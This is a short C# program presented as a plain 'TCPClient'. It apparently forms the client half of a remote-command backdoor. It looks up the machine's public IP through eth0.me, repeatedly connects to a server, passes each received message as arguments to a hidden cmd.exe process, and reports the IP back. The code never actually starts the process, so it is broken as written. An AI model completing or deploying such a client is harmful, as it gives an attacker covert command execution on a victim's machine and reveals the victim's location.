using System;
using System.Net;
using System.Diagnostics;
using System.Net.Sockets;
using System.Net.Http;
using System.Threading.Tasks;

namespace TCPClient
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            // Initialisation
            bool finished = false;

            const int port = 13000;
            const string serverIp = "127.0.0.1";
            string ip = await GetIp();

            // Get the IP adress and while the cliend hasn't been able to send bytes, continue
            while (!finished)
            {
                finished = HandleTcp(serverIp, port, ip);
                ip = await GetIp();
            }
            Environment.Exit(0);
        }

        /// <summary>
        /// Get the message, handle it and send the client IP to the servver
        /// </summary>
        /// <param name="serverIp">The IP of the server</param>
        /// <param name="port">The port which is used to access the server</param>
        /// <param name="ip">The IP of the client which has been collected with GetIp()</param>
        /// <returns>A bool that is the succes of the handeling</returns>
        private static bool HandleTcp(string serverIp, int port, string ip)
        {
            try
            {
                // Initialisation
                TcpClient client = new TcpClient(serverIp, port);
                byte[] bytes = new byte[256];

                NetworkStream stream = client.GetStream();
                Console.WriteLine("\n Found server ! \n");

                string message = string.Empty;

                while (stream.Read(bytes, 0, bytes.Length) != 0)
                {
                    message = System.Text.Encoding.ASCII.GetString(bytes);

                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = message;
                    process.StartInfo.CreateNoWindow = true;

                    if (ip != null)
                    {
                        byte[] response = System.Text.Encoding.ASCII.GetBytes(ip);
                        stream.Write(response, 0, response.Length);
                    }
                    else
                    {
                        byte[] response = new byte[0];
                        stream.Write(response, 0, response.Length);
                    }
                }
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message + Environment.NewLine);
                return false;
            }
        }

        /// <summary>
        /// Get the public IP of the client by fetching eth0.me
        /// </summary>
        /// <returns>The client IP</returns>
        private static async Task<string> GetIp()
        {
            string ip = null;
            try
            {
                // Get response as HttpResponseMessage
                HttpClient httpClient = new HttpClient();
                HttpResponseMessage response = await httpClient.GetAsync("https://eth0.me");

                // Convert HttpResponseMessage into a string
                response.EnsureSuccessStatusCode();
                ip = await response.Content.ReadAsStringAsync();
            }
            catch
            {
                Console.WriteLine("Wasn't able to get the client IP");
                return "Nothing";
            }
            return ip;
        }
    }
}